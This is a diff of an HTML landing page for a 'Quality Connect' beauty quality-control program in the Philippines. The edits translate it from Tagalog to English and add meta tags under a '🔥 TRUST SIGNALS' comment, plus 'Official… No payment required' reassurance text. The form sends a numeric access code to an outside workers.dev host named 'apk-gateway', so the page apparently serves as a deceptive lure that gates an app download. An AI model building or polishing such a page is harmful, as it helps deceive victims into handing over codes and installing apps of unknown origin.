@@ -1,113 +1,106 @@
 <!DOCTYPE html>
-<html lang="tl">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Quality Connect - Access</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-    .container {
-      background: white;
-      border-radius: 20px;
-      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-      padding: 40px;
-      max-width: 400px;
-      width: 100%;
-      text-align: center;
-    }
-    h1 {
-      font-size: 28px;
-      color: #1a202c;
-      margin-bottom: 8px;
-      font-weight: 600;
-    }
-    p {
-      color: #718096;
-      margin-bottom: 24px;
-      font-size: 14px;
-    }
-    form input {
-      width: 100%;
-      padding: 14px 18px;
-      border: 2px solid #e2e8f0;
-      border-radius: 10px;
-      font-size: 18px;
-      margin-bottom: 16px;
-      text-align: center;
-      letter-spacing: 4px;
-      font-weight: 600;
-      transition: border 0.2s;
-    }
-    form input:focus {
-      outline: none;
-      border-color: #667eea;
-    }
-    form button {
-      width: 100%;
-      padding: 14px;
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      color: white;
-      border: none;
-      border-radius: 10px;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.3s;
-      box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3);
-    }
-    form button:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 6px 16px rgba(102, 126, 234, 0.4);
-    }
-    form button:active {
-      transform: translateY(0);
-    }
-    .help {
-      background: #ebf8ff;
-      border-left: 4px solid #4299e1;
-      padding: 16px;
-      border-radius: 4px;
-      margin-top: 20px;
-      font-size: 13px;
-      color: #2c5282;
-      text-align: left;
-      line-height: 1.6;
-    }
-  </style>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- 🔥 TRUST SIGNALS -->
+<meta name="description" content="Official Beauty Quality Control Program Philippines">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#667eea">
+
+<title>Quality Connect — Access</title>
+
+<style>
+
+*{margin:0;padding:0;box-sizing:border-box}
+
+body{
+font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+background:linear-gradient(135deg,#667eea,#764ba2);
+min-height:100vh;
+display:flex;
+align-items:center;
+justify-content:center;
+padding:20px;
+}
+
+.container{
+background:white;
+border-radius:20px;
+box-shadow:0 20px 60px rgba(0,0,0,0.25);
+padding:40px;
+max-width:420px;
+width:100%;
+text-align:center;
+}
+
+h1{font-size:28px;margin-bottom:6px}
+p{color:#666;margin-bottom:24px}
+
+input{
+width:100%;
+padding:14px;
+font-size:18px;
+border-radius:10px;
+border:2px solid #e2e8f0;
+margin-bottom:14px;
+text-align:center;
+letter-spacing:4px;
+}
+
+button{
+width:100%;
+padding:14px;
+background:linear-gradient(135deg,#667eea,#764ba2);
+border:none;
+color:white;
+font-weight:600;
+border-radius:10px;
+cursor:pointer;
+}
+
+.note{
+margin-top:20px;
+font-size:13px;
+color:#555;
+background:#f3f8ff;
+padding:14px;
+border-left:4px solid #4299e1;
+}
+
+</style>
 </head>
+
 <body>
-  <div class="container">
-    <h1>Quality Connect</h1>
-    <p>Beauty Quality Control Program</p>
-    
-    <form method="POST" action="https://apk-gateway.loxnesgnome3332-881.workers.dev">
-      <input 
-        type="password"
-        name="pin"
-        placeholder="Enter Access Code"
-        maxlength="6"
-        pattern="[0-9]*"
-        inputmode="numeric"
-        autocomplete="off"
-        required
-      >
-      <button type="submit">I-verify ang Code</button>
-    </form>
 
+<div class="container">
 
-    <div class="help">
-      <strong>Wala pang access code?</strong><br>
-      Makikipag-ugnayan sa project team para makakuha ng personal access code.
-    </div>
-  </div>
+<h1>Quality Connect</h1>
+<p>Beauty Quality Control Program</p>
+
+<form method="POST" action="https://apk-gateway.loxnesgnome3332-881.workers.dev">
+
+<input
+type="password"
+name="pin"
+placeholder="Enter Access Code"
+maxlength="6"
+inputmode="numeric"
+required
+>
+
+<button type="submit">Verify Access</button>
+
+</form>
+
+<div class="note">
+Official quality testing program for selected participants.
+No payment required.
+</div>
+
+</div>
+
 </body>
 </html>
